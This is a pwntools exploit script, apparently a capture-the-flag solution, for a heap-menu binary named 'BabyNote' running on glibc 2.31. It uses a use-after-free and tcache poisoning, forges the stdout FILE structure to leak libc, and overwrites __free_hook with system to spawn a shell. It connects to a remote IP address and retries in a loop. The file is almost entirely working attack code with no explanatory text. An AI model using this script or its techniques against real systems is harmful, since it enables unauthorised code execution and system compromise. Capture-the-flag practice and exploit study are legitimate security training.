from pwn import *
# context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']



def add(content):
    p.sendlineafter(">>> ",str(1))
    p.sendafter("Input Content:\n",content)
def gift():
    p.sendlineafter(">>> ",str(666))
def delete(id):
    p.sendlineafter(">>> ",str(3))
    p.sendlineafter("Input ID:\n",str(id))
def edit(id,content):
    p.sendlineafter(">>> ",str(2))
    p.sendlineafter("Input ID:\n",str(id))
    p.sendafter("Input Content:\n",content)

def exp():
    add('a'*58)#0
    add('a'*58)#1
    add('a'*58)#2
    for _ in range(8):
        delete(0)
        edit(0,'b'*0x58)
    edit(0,'\x00'*0x10)
    p.sendlineafter(">>> ",'1'*0x450)
    edit(0,'\xa0\x66')

    stdout_offset = libc.symbols['_IO_2_1_stdout_']
    log.info("stdout_offset:"+hex(stdout_offset))

    add('c'*0x8)#3
    # gdb.attach(p,"b *$rebase(0x1392)")
    # raw_input()
    add(p64(0x0FBAD1887) +p64(0)*3 + p8(0x00))#4
    libc_addr = u64(p.recvuntil('\x7f',timeout=1)[-6:].ljust(8,'\x00'))-(0x7fbe678e5980-0x7fbe676fa000)#- (0x7ffff7fac980-0x7ffff7dc1000)
    log.info("libc_addr:"+hex(libc_addr))

    free_hook = libc_addr+libc.sym['__free_hook']
    system_addr = libc_addr+libc.sym['system']
    binsh_str = libc_addr+libc.search('/bin/sh').next()

    delete(1)
    edit(1,p64(free_hook)*2)
    add('/bin/sh\x00')
    add(p64(system_addr))
    delete(1)

    p.interactive()


# p = process("./BabyNote",env={'LD_PRELOAD':'./libc-2.31.so'})
# libc = ELF("./libc-2.31.so")
# exp()

if __name__ == '__main__':
    # p = process("./BabyNote",env={'LD_PRELOAD':'./libc-2.31.so'})
    # libc = ELF("./libc-2.31.so")
    # p = process("./BabyNote")
    # libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    p = remote("8.134.14.168", 10000)
    libc = ELF("./libc-2.31.so")
    while True:
        try:
            exp()
            exit(0)
        except:
            p.close()
            p = remote("8.134.14.168", 10000)
            # p = process("./BabyNote",env={'LD_PRELOAD':'./libc-2.31.so'})
